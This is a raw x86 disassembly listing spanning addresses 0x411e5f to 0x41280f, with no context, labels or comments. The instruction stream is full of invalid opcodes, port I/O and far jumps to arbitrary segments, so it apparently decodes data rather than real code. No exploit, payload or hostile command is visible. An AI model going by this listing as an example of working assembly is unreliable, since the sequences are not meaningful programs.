  411e5f:	loopne 0x411e24
  411e61:	out    0x7e,eax
  411e63:	mov    eax,0x31d26a4b
  411e68:	fs clc 
  411e6a:	clc    
  411e6b:	push   cs
  411e6c:	xchg   esp,eax
  411e6d:	push   eax
  411e6e:	pop    ss
  411e6f:	cdq    
  411e70:	(bad)  
  411e71:	mov    DWORD PTR gs:[edx+0x1e111c08],ebp
  411e78:	imul   ecx,esi,0xafb6117a
  411e7e:	dec    edi
  411e7f:	neg    DWORD PTR [ebx+0x60712fd3]
  411e85:	mov    bl,0x70
  411e87:	(bad)  
  411e88:	xchg   DWORD PTR [ecx-0xd],esp
  411e8b:	push   es
  411e8c:	inc    esi
  411e8d:	inc    esp
  411e8e:	fmul   QWORD PTR [ecx+0x64]
  411e91:	stc    
  411e92:	adc    al,0x7f
  411e94:	out    0xc8,eax
  411e96:	push   ss
  411e97:	ret    
  411e98:	stos   DWORD PTR es:[edi],eax
  411e99:	imul   edi,DWORD PTR [edx-0x54],0x49
  411e9d:	shr    BYTE PTR [esi-0x5f280156],0x6a
  411ea4:	outs   dx,DWORD PTR ds:[esi]
  411ea5:	mov    WORD PTR [esi+ebx*2+0x4c97799d],gs
  411eac:	xor    DWORD PTR ss:[eax],0xffffff96
  411eb0:	cdq    
  411eb1:	mov    dh,0xb1
  411eb3:	inc    esp
  411eb4:	mov    edx,DWORD PTR [ebp+0x14]
  411eb7:	inc    eax
  411eb8:	int3   
  411eb9:	mov    eax,ds:0x37713f78
  411ebe:	pushf  
  411ebf:	or     dl,BYTE PTR [eax+eiz*1+0x7e7a6c18]
  411ec6:	sbb    eax,0x4fe0b627
  411ecb:	lock adc DWORD PTR [ebx-0x2c],ebp
  411ecf:	xchg   edi,eax
  411ed0:	add    esp,ecx
  411ed2:	xchg   esp,eax
  411ed3:	and    al,ah
  411ed5:	loope  0x411ed0
  411ed7:	inc    ebp
  411ed8:	iret   
  411ed9:	js     0x411f42
  411edb:	dec    esi
  411edc:	jle    0x411e67
  411ede:	dec    ecx
  411edf:	inc    ecx
  411ee0:	rcr    BYTE PTR [ebp+0x7b],0x9b
  411ee4:	jecxz  0x411f08
  411ee6:	loope  0x411ef0
  411ee8:	xor    edi,DWORD PTR ds:0x8c027859
  411eee:	bound  esi,QWORD PTR [edi-0x11]
  411ef1:	mov    bl,0x8c
  411ef3:	pop    esi
  411ef4:	adc    ebp,DWORD PTR [ebp-0x6bd5dcba]
  411efa:	js     0x411ec6
  411efc:	in     al,dx
  411efd:	fidiv  WORD PTR [ebp-0x3d0a4755]
  411f03:	inc    eax
  411f04:	mov    eax,ds:0x2774fff5
  411f09:	cwde   
  411f0a:	cli    
  411f0b:	test   BYTE PTR [ebx],al
  411f0d:	(bad)  
  411f0e:	call   0xf108:0xc6054f72
  411f15:	xchg   edx,eax
  411f16:	int    0x5b
  411f18:	and    DWORD PTR [eax+edx*1],eax
  411f1b:	pop    esp
  411f1c:	add    eax,0x8e4c1cde
  411f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f22:	adc    eax,0xbf8e4425
  411f27:	lea    ecx,[ebx-0x306e244b]
  411f2d:	add    DWORD PTR [esi+0x5f],ebx
  411f30:	pop    esp
  411f31:	fsubp  st(5),st
  411f33:	push   esi
  411f34:	dec    edi
  411f35:	push   0x3c45226a
  411f3a:	xlat   BYTE PTR ds:[ebx]
  411f3b:	mov    esp,0xf9fa0384
  411f40:	fnsave [esi+0x477d6da5]
  411f46:	imul   ebx,DWORD PTR ds:0x65589ae8,0x610d0a6b
  411f50:	inc    eax
  411f51:	out    0xe8,eax
  411f53:	xchg   edi,eax
  411f54:	ret    0x2794
  411f57:	inc    ebx
  411f58:	pop    esi
  411f59:	js     0x411f39
  411f5b:	out    0x2a,al
  411f5d:	inc    eax
  411f5e:	xlat   BYTE PTR ds:[ebx]
  411f5f:	sub    esp,DWORD PTR [ecx]
  411f61:	das    
  411f62:	ret    0xd2de
  411f65:	sbb    dl,al
  411f67:	ss dec eax
  411f69:	or     ebp,DWORD PTR [ebp-0x14c60a34]
  411f6f:	shr    DWORD PTR [edi+eax*4],0x15
  411f73:	cmp    al,0xd1
  411f75:	xor    eax,0x6d877c71
  411f7a:	and    DWORD PTR [eax+esi*8],esp
  411f7d:	xor    ebp,DWORD PTR [edx]
  411f7f:	shl    DWORD PTR [eax-0x53],0x60
  411f83:	scas   al,BYTE PTR es:[edi]
  411f84:	add    DWORD PTR [ecx+edi*4],0xffffffef
  411f88:	mov    al,0x30
  411f8a:	jl     0x411fd0
  411f8c:	and    dl,BYTE PTR [ebp*1+0x434b4df2]
  411f93:	in     eax,0xc2
  411f95:	adc    eax,0xe334de9f
  411f9a:	pushf  
  411f9b:	xor    eax,0x2f0b7ea6
  411fa0:	imul   esi,DWORD PTR [ebx+0x3ca0ef42],0x36
  411fa7:	lods   eax,DWORD PTR es:[esi]
  411fa9:	cmp    eax,0xc83e13b4
  411fae:	lock push es
  411fb0:	psrlq  mm7,QWORD PTR [ebx+0x765a154f]
  411fb7:	jb     0x411f56
  411fb9:	and    edi,DWORD PTR [edx-0x5bd9c2e6]
  411fbf:	cs push 0x6a
  411fc2:	out    0xfe,eax
  411fc4:	out    0x8f,eax
  411fc6:	in     eax,0x73
  411fc8:	pushf  
  411fc9:	or     eax,0xc5c90a4a
  411fce:	ins    BYTE PTR es:[edi],dx
  411fcf:	or     al,0x14
  411fd1:	lea    ebp,[ecx-0x23104469]
  411fd7:	and    eax,0x97f3f487
  411fdc:	aam    0xa6
  411fde:	jecxz  0x41202a
  411fe0:	aas    
  411fe1:	pusha  
  411fe2:	mov    al,ds:0xdffb66d0
  411fe7:	je     0x412035
  411fe9:	imul   ebx,edi,0xae2a1068
  411fef:	adc    al,0x26
  411ff1:	pop    gs
  411ff3:	scas   al,BYTE PTR es:[edi]
  411ff4:	xlat   BYTE PTR ds:[ebx]
  411ff5:	mov    al,ds:0x73f41834
  411ffa:	mov    ecx,0x1ee941aa
  411fff:	xor    eax,0x50a897c
  412004:	pop    ebp
  412005:	sub    dh,BYTE PTR [ecx+0x6a51cc59]
  41200b:	push   esi
  41200c:	pop    edi
  41200d:	cmp    al,0x5e
  41200f:	xor    al,0x3c
  412011:	sbb    ch,cl
  412013:	xlat   BYTE PTR ds:[ebx]
  412014:	rcl    BYTE PTR [esi-0x5cf77bff],cl
  41201a:	aas    
  41201b:	ss retf 
  41201d:	retf   0xed9a
  412020:	pop    edx
  412021:	adc    DWORD PTR [edi-0x7b],esp
  412024:	mov    cl,BYTE PTR [ebx-0x726d5a5e]
  41202a:	pusha  
  41202b:	outs   dx,DWORD PTR ds:[esi]
  41202c:	jle    0x411fd2
  41202e:	out    0x8a,eax
  412030:	inc    edx
  412031:	xor    esp,esi
  412033:	in     eax,0x78
  412035:	sub    eax,0x4ad6a5b7
  41203a:	xor    eax,edi
  41203c:	pop    edx
  41203d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41203e:	xor    al,0x76
  412040:	fsub   DWORD PTR [esi-0x12]
  412043:	add    ah,ah
  412045:	imul   edi,ebp,0x72523305
  41204b:	mov    eax,0x306dac0
  412050:	ins    BYTE PTR es:[edi],dx
  412051:	and    BYTE PTR [ebp+0x6a],cl
  412054:	jo     0x412084
  412056:	mov    cl,0x9e
  412058:	push   edx
  412059:	leave  
  41205a:	mov    dl,0xd9
  41205d:	in     eax,0xa4
  41205f:	retf   0xead2
  412062:	dec    ebp
  412063:	mov    DWORD PTR [ebp-0x1a66d885],eax
  412069:	xchg   ecx,eax
  41206a:	and    al,0x72
  41206c:	push   es
  41206d:	loope  0x411ff1
  41206f:	ss repnz mov dl,0x72
  412073:	pop    ss
  412074:	mov    BYTE PTR [eax+eiz*8-0x323cc6fa],al
  41207b:	sbb    DWORD PTR [esi-0x43123fa8],ecx
  412081:	mov    eax,ds:0x592dc0fd
  412086:	or     al,0x41
  412088:	adc    eax,0x7be1b82a
  41208d:	dec    eax
  41208e:	aad    0xb7
  412090:	stos   DWORD PTR es:[edi],eax
  412091:	jge    0x412064
  412093:	aaa    
  412094:	push   es
  412095:	and    BYTE PTR [ebx+0x1d],0xa0
  412099:	inc    eax
  41209b:	xor    eax,0xa1f5ba5c
  4120a0:	sbb    DWORD PTR [ebp-0x273a96d2],esi
  4120a6:	jnp    0x4120f4
  4120a8:	and    al,0xba
  4120aa:	push   ebx
  4120ab:	jno    0x412061
  4120ad:	push   ds
  4120ae:	add    ebx,eax
  4120b0:	jecxz  0x4120b6
  4120b2:	add    eax,0xeb17ba77
  4120b7:	rcr    BYTE PTR [edi-0x6d],cl
  4120ba:	inc    eax
  4120bb:	mov    ebp,0x74ff106b
  4120c0:	mov    WORD PTR [edi+0x1],gs
  4120c3:	jg     0x412068
  4120c5:	outs   dx,BYTE PTR ds:[esi]
  4120c6:	sar    BYTE PTR [edi+0x1b],0xb5
  4120ca:	push   esi
  4120cb:	xchg   edx,eax
  4120cc:	lock mov dl,0xbb
  4120cf:	test   DWORD PTR [edx-0x5a1baa0e],esi
  4120d5:	xor    edx,eax
  4120d7:	cmc    
  4120d8:	and    BYTE PTR cs:0x7143827b,bl
  4120df:	add    BYTE PTR [edx],cl
  4120e1:	iret   
  4120e2:	pushf  
  4120e3:	test   al,0x79
  4120e5:	pop    ss
  4120e6:	cs shl ah,0xb4
  4120ea:	pop    es
  4120eb:	vandps ymm3,ymm1,ymm5
  4120ef:	rcl    DWORD PTR [eax+edi*8+0x69115fd5],1
  4120f6:	out    0xcf,al
  4120f8:	push   0x8df9650
  4120fd:	sub    esi,eax
  4120ff:	je     0x4120f1
  412101:	or     eax,0xc4d5d03a
  412106:	xchg   edi,eax
  412107:	xchg   BYTE PTR [ecx],ah
  412109:	and    BYTE PTR [ecx],al
  41210b:	jmp    0x6e64:0x2d9838e6
  412112:	fisttp DWORD PTR [ecx]
  412114:	pop    ebx
  412115:	add    al,0x55
  412117:	xchg   DWORD PTR [ebp-0xd28576f],edx
  41211d:	sbb    dh,BYTE PTR [ecx-0x2f]
  412120:	jp     0x412175
  412122:	push   esp
  412123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412124:	xchg   ecx,eax
  412125:	sahf   
  412126:	pop    esi
  412127:	jne    0x412172
  412129:	cmc    
  41212a:	call   0x50844d0c
  41212f:	imul   ebx,DWORD PTR [ecx+ecx*2],0x4ab19f96
  412136:	ja     0x412123
  412138:	xlat   BYTE PTR ds:[ebx]
  412139:	cs pusha 
  41213b:	xor    dl,bl
  41213d:	jo     0x4121b9
  41213f:	fdivr  QWORD PTR ss:[ebx]
  412142:	lock test DWORD PTR [ecx],0x766db88
  412149:	out    dx,al
  41214a:	adc    eax,0xa3fd54eb
  41214f:	mov    eax,ds:0xfa194c13
  412154:	ins    DWORD PTR es:[edi],dx
  412155:	jecxz  0x412139
  412157:	out    dx,eax
  412158:	push   0xe90de105
  41215d:	clc    
  41215e:	cld    
  41215f:	dec    eax
  412160:	or     eax,0xd015d69b
  412165:	rcl    DWORD PTR [edx-0x67],0xfd
  412169:	outs   dx,BYTE PTR ds:[esi]
  41216a:	sahf   
  41216b:	cmp    dh,BYTE PTR [eax]
  41216d:	push   edi
  41216e:	nop
  41216f:	(bad)  
  412171:	pushf  
  412172:	call   0xb54f:0x1e15bea7
  412179:	inc    esp
  41217a:	push   ecx
  41217b:	sub    BYTE PTR [ecx+0x3bc7774b],bh
  412181:	mov    ebp,0xd5cf7957
  412186:	in     eax,0xf2
  412188:	add    eax,0x1438b52b
  41218d:	jb     0x4121dc
  41218f:	in     al,dx
  412190:	mov    esi,0xd91cc9ea
  412195:	mov    ds:0x8cbab39c,al
  41219a:	es jge 0x412133
  41219d:	inc    esp
  41219e:	push   eax
  41219f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121a0:	cdq    
  4121a1:	add    ebp,DWORD PTR [ebx+edx*2-0x7d]
  4121a5:	mov    ?,WORD PTR [eax]
  4121a7:	mov    dl,0xb2
  4121a9:	push   0xfd9e8b61
  4121ae:	daa    
  4121af:	imul   ebp,DWORD PTR [ebp-0x59],0xa8f860d8
  4121b6:	add    ecx,DWORD PTR [edi+eiz*1]
  4121b9:	arpl   di,cx
  4121bb:	jge    0x4121fc
  4121bd:	jp     0x412183
  4121bf:	std    
  4121c0:	add    eax,DWORD PTR [edx+0x10]
  4121c3:	sub    esi,DWORD PTR [edx+eax*4+0x74]
  4121c7:	xchg   edx,eax
  4121c8:	add    BYTE PTR [ecx],0x2d
  4121cb:	dec    esi
  4121cc:	lock out dx,al
  4121ce:	inc    edx
  4121cf:	inc    eax
  4121d0:	cmp    bh,BYTE PTR [eax+0x59]
  4121d3:	sti    
  4121d4:	push   ebx
  4121d5:	test   al,0xc4
  4121d7:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4121d9:	jae    0x4121bf
  4121db:	pop    ebp
  4121dc:	pop    ebx
  4121dd:	cmc    
  4121de:	mov    bl,0xe4
  4121e0:	outs   dx,BYTE PTR ds:[esi]
  4121e1:	pop    eax
  4121e2:	xlat   BYTE PTR ds:[ebx]
  4121e3:	scas   al,BYTE PTR es:[edi]
  4121e4:	sub    dh,dh
  4121e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121e7:	neg    BYTE PTR [eax]
  4121e9:	ror    DWORD PTR [ecx-0x3e0a98c4],cl
  4121ef:	add    ebx,DWORD PTR [ebx]
  4121f1:	pusha  
  4121f2:	xor    DWORD PTR [eax+eax*4],eax
  4121f5:	xchg   edx,eax
  4121f6:	dec    edx
  4121f7:	ss xor ch,al
  4121fa:	jle    0x41218c
  4121fc:	repz shl DWORD PTR [eax-0x6ed0c7de],cl
  412203:	jecxz  0x4121b8
  412205:	cmp    al,0x3f
  412207:	cs jae 0x4121f2
  41220a:	pop    ss
  41220b:	out    0xae,al
  41220d:	(bad)  [ecx-0x7d]
  412210:	or     DWORD PTR [ebp-0x1],eax
  412213:	call   FWORD PTR [esi]
  412215:	or     eax,0x3ba6b09e
  41221a:	loop   0x4121e4
  41221c:	ret    
  41221d:	xchg   edx,eax
  41221e:	sbb    al,0x9b
  412220:	(bad)  
  412221:	sar    BYTE PTR [ebp+0x30482416],1
  412227:	pop    ebp
  412228:	inc    esi
  412229:	aas    
  41222a:	jmp    0xe997:0x4dcadd3b
  412231:	mov    ds:0x4184031b,eax
  412236:	cmpxchg BYTE PTR [edi],bh
  412239:	in     al,dx
  41223a:	cmp    esi,DWORD PTR [eax+esi*2-0x4ba54b4]
  412241:	in     al,0x2b
  412243:	pop    es
  412244:	pop    ss
  412245:	pop    edi
  412246:	adc    eax,0xd959e853
  41224b:	and    DWORD PTR [eax+0xfbc300d],esi
  412251:	ret    
  412252:	xchg   BYTE PTR [esi-0x1a87af04],ch
  412258:	retf   0x3948
  41225b:	inc    ecx
  41225c:	push   ebp
  41225d:	es ror bl,cl
  412260:	aad    0xea
  412262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412263:	inc    ebx
  412264:	dec    ecx
  412265:	inc    ebx
  412266:	nop
  412267:	jmp    0x41223b
  412269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41226a:	mov    esi,0xb1a1c9ca
  41226f:	das    
  412270:	add    al,0x1c
  412272:	adc    BYTE PTR [ecx-0x5a],0x73
  412276:	cli    
  412277:	rcr    ebx,1
  412279:	cmp    al,0x37
  41227b:	xor    dh,ch
  41227d:	(bad)  
  41227e:	loop   0x41226c
  412280:	xor    BYTE PTR [esi+0x11bb3cda],ch
  412286:	jmp    0xe1311c48
  41228b:	cmp    ecx,edx
  41228d:	out    dx,al
  41228e:	cmp    DWORD PTR [edx],ecx
  412290:	and    al,0x8e
  412292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412293:	push   0x924d6c66
  412298:	imul   ecx,DWORD PTR [esi-0xfe1e6a3],0x19d5ded8
  4122a2:	(bad)  
  4122a3:	retf   0xda83
  4122a6:	leave  
  4122a7:	out    0x10,al
  4122a9:	inc    eax
  4122aa:	mov    esp,0x5dca15e4
  4122af:	xor    ah,bl
  4122b1:	push   ecx
  4122b2:	xchg   BYTE PTR [esi+0x157132f6],ch
  4122b8:	add    BYTE PTR [esi+0x43],cl
  4122bb:	jle    0x412337
  4122bd:	add    eax,esp
  4122bf:	imul   dx,WORD PTR [edx-0x4d911438],0x32
  4122c7:	push   cs
  4122c8:	int    0xea
  4122ca:	pop    eax
  4122cb:	js     0x4122df
  4122cd:	mov    WORD PTR [esi],ss
  4122cf:	mov    cl,0x27
  4122d1:	cmp    eax,eax
  4122d3:	push   cs
  4122d4:	xchg   ecx,eax
  4122d5:	pop    eax
  4122d6:	rol    DWORD PTR [eax+0x52f5d2b5],cl
  4122dc:	daa    
  4122dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122de:	aad    0xfc
  4122e0:	test   BYTE PTR [edx+ebp*4+0x26],al
  4122e4:	sbb    ah,0x59
  4122e7:	out    dx,al
  4122e8:	xchg   ecx,eax
  4122e9:	bound  edi,QWORD PTR [esi-0x80]
  4122ec:	pop    cx
  4122ee:	aaa    
  4122ef:	push   ebp
  4122f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122f1:	loopne 0x4122f2
  4122f3:	popa   
  4122f4:	fs es add al,0x36
  4122f8:	adc    al,0x2c
  4122fa:	fmul   DWORD PTR [ebx-0x2d]
  4122fd:	les    ebp,FWORD PTR [edi]
  4122ff:	cmp    esp,DWORD PTR [ecx]
  412301:	enter  0x749a,0x94
  412305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412306:	aaa    
  412307:	xor    eax,0x47ce793d
  41230c:	push   eax
  41230d:	pop    esi
  41230e:	out    dx,eax
  41230f:	mov    ebp,0x338d7b96
  412314:	div    dl
  412316:	(bad)  
  412317:	cld    
  412318:	push   ecx
  412319:	jno    0x4122e8
  41231b:	ds das 
  41231d:	xchg   ebx,eax
  41231e:	dec    edi
  41231f:	ins    DWORD PTR es:[edi],dx
  412320:	inc    esi
  412321:	mov    esi,0xfff07a9c
  412326:	push   ss
  412327:	scas   eax,DWORD PTR es:[edi]
  412328:	mov    ah,0x2
  41232a:	daa    
  41232b:	in     eax,0x50
  41232d:	stos   BYTE PTR es:[edi],al
  41232e:	popf   
  41232f:	jno    0x45937711
  412335:	cwde   
  412336:	dec    ebp
  412337:	shl    DWORD PTR [ebx+esi*2-0x470fb6d9],0x4b
  41233f:	sbb    DWORD PTR [ecx],0x6b4125ae
  412345:	ins    DWORD PTR es:[edi],dx
  412346:	js     0x41234a
  412348:	lea    ecx,[eax]
  41234a:	sbb    al,0x81
  41234c:	dec    eax
  41234d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41234e:	aaa    
  41234f:	jae    0x4122f1
  412351:	mov    al,ds:0x285d2079
  412356:	daa    
  412357:	(bad)  
  412358:	jbe    0x41231a
  41235a:	mov    ecx,0x18da59a9
  41235f:	push   cs
  412360:	enter  0x622d,0xa7
  412364:	push   ss
  412365:	jle    0x4123ac
  412367:	and    eax,0x92e0901f
  41236c:	and    eax,0xfc437f94
  412371:	or     DWORD PTR [ebx],edx
  412373:	pushf  
  412374:	xor    DWORD PTR [ecx],esp
  412376:	add    DWORD PTR [ebp-0x1],0xa94a7e07
  41237d:	rol    BYTE PTR [eax],cl
	...
  412553:	add    BYTE PTR [eax],al
  412555:	add    BYTE PTR [edi-0x1ab332f],ch
  41255b:	pop    ebp
  41255c:	mov    edi,0x5e13fbfb
  412561:	cmp    DWORD PTR [edx+0x49c4068f],ecx
  412567:	loop   0x41256a
  412569:	add    BYTE PTR [edx],ah
  41256b:	pop    es
  41256c:	add    BYTE PTR [eax],al
  41256e:	mov    bl,0x8d
  412570:	adc    al,BYTE PTR [ebx+0x21]
  412573:	fs and al,0x1
  412576:	xor    eax,0x61e4598a
  41257b:	test   dh,dh
  41257d:	in     al,dx
  41257e:	push   0x41
  412580:	jg     0x4125c2
  412582:	shl    BYTE PTR [ebx+edx*2],0xf2
  412586:	int    0x1e
  412588:	cmp    esp,DWORD PTR [esi+0x44a0a8df]
  41258e:	xchg   bl,ah
  412590:	push   es
  412591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412592:	or     DWORD PTR [eax-0x21f38fb6],esp
  412598:	int    0x4
  41259a:	or     eax,0xe251eb1f
  41259f:	xchg   ebx,eax
  4125a0:	es push ebx
  4125a2:	pop    ebp
  4125a3:	(bad)  
  4125a4:	pop    eax
  4125a5:	rcr    esp,0x3c
  4125a8:	fldenv [esi]
  4125aa:	fimul  WORD PTR [ecx-0x52]
  4125ad:	je     0x4125f1
  4125af:	mov    ebp,0x136229ab
  4125b4:	cmp    edx,ebx
  4125b6:	fild   WORD PTR [ebp+0x13]
  4125b9:	and    al,0xd7
  4125bb:	in     al,0x9c
  4125bd:	imul   eax,DWORD PTR [ebx],0xc7cdb7d5
  4125c3:	test   BYTE PTR [edx-0x26],ch
  4125c6:	test   BYTE PTR [edi-0xf],dl
  4125c9:	leave  
  4125ca:	push   eax
  4125cb:	cs jecxz 0x412570
  4125ce:	loope  0x4125e8
  4125d0:	cmp    al,0x2
  4125d2:	pmaxsw mm4,QWORD PTR [esp+eiz*8]
  4125d6:	push   ecx
  4125d7:	data16 fneni(8087 only) 
  4125da:	into   
  4125db:	cmp    eax,ebp
  4125dd:	mov    ecx,edx
  4125df:	mov    edx,0x9008666e
  4125e4:	sub    bh,dh
  4125e6:	jno    0x4125e9
  4125e8:	sub    al,bl
  4125ea:	fcmove st,st(6)
  4125ec:	jnp    0x412608
  4125ee:	jmp    0x412662
  4125f0:	cli    
  4125f1:	jl     0x4125b4
  4125f3:	add    DWORD PTR [esi-0x4a],ecx
  4125f6:	retf   0x25c6
  4125f9:	push   ebp
  4125fa:	ss stos DWORD PTR es:[edi],eax
  4125fc:	mov    edx,0xe3581e99
  412601:	cmp    BYTE PTR [edx-0x25],al
  412604:	ins    DWORD PTR es:[edi],dx
  412605:	dec    esp
  412606:	shl    ebx,0x88
  412609:	xchg   al,bl
  41260b:	cld    
  41260c:	nop
  41260d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41260e:	stos   DWORD PTR es:[edi],eax
  41260f:	sub    bh,BYTE PTR [ebp-0x75]
  412612:	pop    ecx
  412613:	ss jb  0x41265c
  412616:	sub    BYTE PTR [eax+0x3ba9070e],dh
  41261c:	mov    cl,0xe6
  41261e:	sbb    al,0x27
  412620:	xor    al,0x29
  412622:	or     eax,0xb32d675
  412627:	sbb    dl,dh
  412629:	jb     0x412656
  41262b:	sbb    eax,0x8aeed365
  412630:	ds (bad) 
  412632:	push   ebp
  412633:	push   ss
  412634:	shl    BYTE PTR [ebp+0x4760b259],1
  41263a:	dec    esp
  41263b:	sub    al,0xf9
  41263d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41263e:	mov    bl,0x42
  412640:	dec    edi
  412641:	js     0x4125f4
  412643:	out    0x34,al
  412645:	mov    DWORD PTR [edx+0x4bbfbba5],eax
  41264b:	stc    
  41264c:	dec    esp
  41264d:	or     DWORD PTR [edi],0xfffffffa
  412650:	call   0xac21:0x28aa24f8
  412657:	add    edi,ecx
  412659:	(bad)  
  41265a:	sbb    dl,BYTE PTR [eax]
  41265c:	sahf   
  41265d:	mov    dh,0x9d
  41265f:	cmp    eax,0x30ef2eb0
  412664:	inc    DWORD PTR [eax+0x1c]
  412667:	fucomp st(4)
  412669:	and    ecx,edx
  41266b:	je     0x41261f
  41266d:	push   edi
  41266e:	fmul   QWORD PTR [ecx]
  412670:	ret    0x1103
  412673:	mov    cl,0xc2
  412675:	das    
  412676:	mov    bh,0xdd
  412678:	out    dx,eax
  412679:	popa   
  41267a:	mov    ebx,0x4d0dd789
  41267f:	cmp    eax,eax
  412681:	mov    ah,0x95
  412683:	mov    eax,ds:0x3d587d2c
  412688:	add    ebp,DWORD PTR [eax+0x1e1a4f5a]
  41268e:	sub    ebp,DWORD PTR [esi-0x6a]
  412691:	push   cs
  412692:	aam    0x33
  412694:	mov    ebx,esp
  412696:	inc    edi
  412697:	mov    al,0xa2
  412699:	cmp    DWORD PTR [eax-0x2a18deff],ebx
  41269f:	mov    ebp,0x7ed56c0f
  4126a4:	or     al,BYTE PTR [esi-0xa67758f]
  4126aa:	push   eax
  4126ab:	cdq    
  4126ac:	or     dl,BYTE PTR [ecx+0x23768548]
  4126b2:	test   al,0x50
  4126b4:	push   ds
  4126b5:	ins    DWORD PTR es:[edi],dx
  4126b6:	std    
  4126b7:	fs jecxz 0x41271f
  4126ba:	mov    ecx,0xc4f92e89
  4126bf:	(bad)  
  4126c0:	psrld  mm3,QWORD PTR [edx+0x1f3c3e87]
  4126c7:	push   edx
  4126c8:	mov    ds:0x154a18e9,al
  4126cd:	jge    0x41272d
  4126cf:	xchg   edx,esp
  4126d1:	add    BYTE PTR [ebp+esi*4+0x9],0x43
  4126d6:	popa   
  4126d7:	cmc    
  4126d8:	dec    ebx
  4126d9:	sti    
  4126da:	xchg   BYTE PTR [ecx],ah
  4126dc:	sar    DWORD PTR ds:0x643a74d8,0xc6
  4126e3:	cld    
  4126e4:	cdq    
  4126e5:	ret    0x9835
  4126e8:	jne    0x4126b5
  4126ea:	pop    ss
  4126eb:	sbb    ecx,DWORD PTR [edi+0x52]
  4126ee:	sub    al,0xef
  4126f0:	mov    cl,0x5e
  4126f2:	retf   0x2197
  4126f5:	xchg   ebx,eax
  4126f6:	call   0xfb16df5
  4126fb:	adc    BYTE PTR [eax-0x27edc085],al
  412701:	mov    ah,0x83
  412703:	or     al,0x82
  412705:	cli    
  412706:	mov    dl,0x61
  412708:	pop    ebx
  412709:	sub    ebx,ebx
  41270b:	mov    ds,WORD PTR [ecx-0x2810567b]
  412711:	into   
  412712:	add    eax,0x2c8f0bed
  412717:	xor    eax,0x7602f7fe
  41271c:	je     0x41278b
  41271e:	enter  0xd941,0x8a
  412722:	push   0x3ed8306b
  412727:	enter  0xfe0c,0x0
  41272b:	pushf  
  41272c:	pop    eax
  41272d:	mov    WORD PTR [ebp+0x1104b8a2],?
  412733:	pop    edi
  412734:	addr16 push ss
  412736:	pop    edi
  412737:	mov    esi,0x82b57c9e
  41273c:	fidivr WORD PTR [ebx]
  41273e:	sbb    BYTE PTR [ecx+0x1e4ac992],cl
  412744:	xchg   ebx,eax
  412745:	js     0x412716
  412747:	lods   al,BYTE PTR ds:[esi]
  412748:	xor    BYTE PTR [ebx],0xe5
  41274b:	ds inc ecx
  41274d:	aaa    
  41274e:	mov    al,BYTE PTR [edi+esi*8-0x11c33d51]
  412755:	pop    es
  412756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412757:	cwde   
  412758:	jns    0x41270e
  41275a:	adc    dl,BYTE PTR [edi-0x9]
  41275d:	xchg   esp,eax
  41275e:	sub    edi,DWORD PTR [ecx-0x1b]
  412761:	ins    DWORD PTR es:[edi],dx
  412762:	push   0xffffffb2
  412764:	pop    ebp
  412765:	sbb    ebp,eax
  412767:	retf   0x6034
  41276a:	mov    bl,0x5c
  41276c:	dec    edx
  41276d:	imul   edx,DWORD PTR [eax],0xffffff9e
  412770:	push   0xed9962b
  412775:	xlat   BYTE PTR ds:[ebx]
  412776:	imul   edx,DWORD PTR [ebp-0x539e5896],0x66
  41277d:	ins    DWORD PTR es:[edi],dx
  41277e:	sub    ah,bh
  412780:	in     eax,0xdd
  412782:	xor    bl,BYTE PTR [esi+0x28bbe0c4]
  412788:	pop    ebx
  412789:	mov    ch,bl
  41278b:	mov    ah,dl
  41278d:	(bad)  
  41278e:	dec    esp
  41278f:	into   
  412790:	pop    esi
  412791:	sar    BYTE PTR [edx-0x30],0x78
  412795:	xchg   ecx,eax
  412796:	shl    DWORD PTR [edx-0x65],cl
  412799:	adc    eax,0x366825c2
  41279e:	ss inc esp
  4127a0:	out    0x7,eax
  4127a2:	lahf   
  4127a3:	(bad)  
  4127a4:	mov    dl,0x45
  4127a6:	dec    BYTE PTR [ebp+0x4ae10d0f]
  4127ac:	addr16 std 
  4127ae:	pushf  
  4127af:	imul   esi,DWORD PTR [edi-0x72],0xce5d86c5
  4127b6:	mov    ebp,0xde2afa55
  4127bb:	xchg   edi,eax
  4127bc:	retf   
  4127bd:	xor    dh,BYTE PTR [bp+si+0x4a92]
  4127c2:	or     bh,ah
  4127c4:	xor    al,0x66
  4127c6:	(bad)  
  4127c7:	bnd jnp 0x4127b6
  4127ca:	daa    
  4127cb:	popf   
  4127cc:	mov    edi,0xeed982a1
  4127d1:	lods   eax,DWORD PTR ds:[esi]
  4127d2:	retf   0x152c
  4127d5:	inc    ebx
  4127d6:	fisub  WORD PTR [edi-0x24]
  4127d9:	pop    esp
  4127da:	(bad)  
  4127dc:	jge    0x412823
  4127de:	push   eax
  4127df:	dec    ecx
  4127e0:	data16 mov BYTE PTR fs:[eax+0x2e],ch
  4127e5:	lods   al,BYTE PTR ds:[esi]
  4127e6:	mov    eax,0x29abb837
  4127eb:	jl     0x4127c5
  4127ed:	sub    BYTE PTR [ebx+0x27],ah
  4127f0:	in     eax,dx
  4127f1:	dec    esp
  4127f2:	jae    0x4127af
  4127f4:	hlt    
  4127f5:	xchg   BYTE PTR [ecx],al
  4127f7:	pop    ss
  4127f8:	ror    BYTE PTR [eax+0x7e],0x85
  4127fc:	in     eax,0xe4
  4127fe:	pop    edi
  4127ff:	push   0xfffffffe
  412801:	ficomp WORD PTR [esi]
  412803:	jne    0x412795
  412805:	mov    ebp,0x1cc2fe3c
  41280a:	sub    dh,BYTE PTR [edi]
  41280c:	popa   
  41280d:	ja     0x412807
  41280f:	int    0x41
